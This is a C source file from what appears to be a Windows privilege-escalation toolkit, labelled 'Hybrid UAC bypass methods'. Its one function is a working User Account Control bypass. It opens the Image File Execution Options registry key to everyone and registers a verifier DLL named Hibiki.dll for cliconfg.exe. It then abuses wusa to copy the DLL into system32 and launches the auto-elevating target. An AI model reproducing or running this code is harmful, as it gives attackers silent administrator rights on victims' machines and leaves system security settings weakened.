/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2015
*
*  TITLE:       HYBRIDS.C
*
*  VERSION:     1.50
*
*  DATE:        05 Apr 2015
*
*  Hybrid UAC bypass methods.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"

#define T_IFEO						L"MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options"
#define T_AVRFDLL					L"Hibiki.dll"
#define T_AVRF_SOURCEDLL			L"%temp%\\Hibiki.dll"
#define T_AVRF_MSUPACKAGE			L"%temp%\\ellocnak.msu"
#define T_AVRF_CMDLINE				L"/c wusa %ws /extract:%%windir%%\\system32"

BOOL ucmAvrfMethod(
	PVOID AvrfDll,
	DWORD AvrfDllSize
	)
{
	BOOL bResult = FALSE, cond = FALSE;
	HKEY hKey = NULL, hSubKey = NULL;
	LRESULT lRet;
	DWORD dwValue = 0x100; // FLG_APPLICATION_VERIFIER;
	WCHAR szCmd[MAX_PATH * 4];

	if (
		(AvrfDll == NULL) ||
		(AvrfDllSize == 0)
		)
	{
		return bResult;
	}

	do {

		//
		// Set new key security dacl
		// Red Alert: manually restore IFEO key permissions after using this tool, as they are not inherited.
		//
		if (!ucmSimdaAlterKeySecurity(T_IFEO, T_SSDL_ALL_FOR_EVERYONE)) {
			OutputDebugString(TEXT("[UCM] Failed to alter key security"));
			break;
		}

		//open IFEO key
		lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options"),
			0, KEY_ALL_ACCESS, &hKey);
		if ((lRet != ERROR_SUCCESS) || (hKey == NULL)) {
			OutputDebugString(TEXT("[UCM] Failed to open IFEO key"));
			break;
		}

		//Set new key and values
		hSubKey = NULL;
		lRet = RegCreateKey(hKey, TEXT("cliconfg.exe"), &hSubKey);
		if ((hSubKey == NULL) || (lRet != ERROR_SUCCESS)) {
			OutputDebugString(TEXT("[UCM] Failed to create IFEO subkey"));
			break;
		}

		lRet = RegSetValueEx(hSubKey, TEXT("GlobalFlag"), 0, REG_DWORD, (BYTE*)&dwValue, sizeof(DWORD));
		if (lRet != ERROR_SUCCESS) {
			OutputDebugString(TEXT("[UCM] Failed to set subkey value 1"));
			break;
		}

		dwValue = (DWORD)_strlen(T_AVRFDLL) * sizeof(TCHAR);
		lRet = RegSetValueEx(hSubKey, TEXT("VerifierDlls"), 0, REG_SZ, (BYTE*)&T_AVRFDLL, dwValue);
		if (lRet != ERROR_SUCCESS) {
			OutputDebugString(TEXT("[UCM] Failed to set subkey value 2"));
			break;
		}

		// Cleanup registry, we don't need anymore.
		RegCloseKey(hSubKey);
		hSubKey = NULL;
		RegCloseKey(hKey);
		hKey = NULL;

		// Drop Hibiki to system32
		if (!ucmWusaCopyFile(T_AVRF_SOURCEDLL, T_AVRF_MSUPACKAGE, T_AVRF_CMDLINE,
			AvrfDll, AvrfDllSize))
		{
			OutputDebugString(TEXT("[UCM] Wusa failed copy Hibiki"));
			break;
		}

		// Finally run target fusion process.
		RtlSecureZeroMemory(szCmd, sizeof(szCmd));
		if (ExpandEnvironmentStringsW(METHOD_SQLSVR_TARGETAPP,
			szCmd, MAX_PATH) == 0)
		{
			break;
		}
		bResult = supRunProcess(szCmd, NULL);

	} while (cond);

	if (hKey != NULL) {
		RegCloseKey(hKey);
	}
	if (hSubKey != NULL) {
		RegCloseKey(hSubKey);
	}
	return bResult;
}
